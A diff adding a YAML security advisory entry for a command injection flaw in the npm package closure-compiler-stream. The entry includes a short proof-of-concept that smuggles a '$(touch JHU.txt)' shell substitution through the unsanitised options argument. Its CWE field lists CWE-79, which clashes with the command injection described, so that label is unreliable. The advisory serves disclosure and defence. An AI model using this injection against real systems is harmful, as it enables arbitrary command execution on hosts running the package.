@@ -1,0 +1,41 @@
+---
+- id: snykio:npm:closure-compiler-stream:560123
+  title: Command Injection
+  description: |
+    [closure-compiler-stream][1] is a Streaming interface for closure
+    compiler.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    The argument `options` of the exports function in `index.js` can be
+    controlled by users without any sanitization.
+
+    ### PoC   {#poc}
+
+        var root = require("closure-compiler-stream");
+        var gulp = require("gulp");
+        var options = {
+           module:[[123],[ "$(touch JHU.txt)"]]
+        }
+        gulp.src("./closure-compiler-stream.js")
+          .pipe(root(options));
+
+
+
+    [1]: https://www.npmjs.com/package/closure-compiler-stream
+  affected_package: closure-compiler-stream
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2020-7603
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-03-13
+  created_date: 2020-03-13
+  last_modified_date: 2020-03-13
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/davidrekow/closure-compiler-stream/blob/master/index.js#L110
+  source_url: https://snyk.io/vuln/SNYK-JS-CLOSURECOMPILERSTREAM-560123
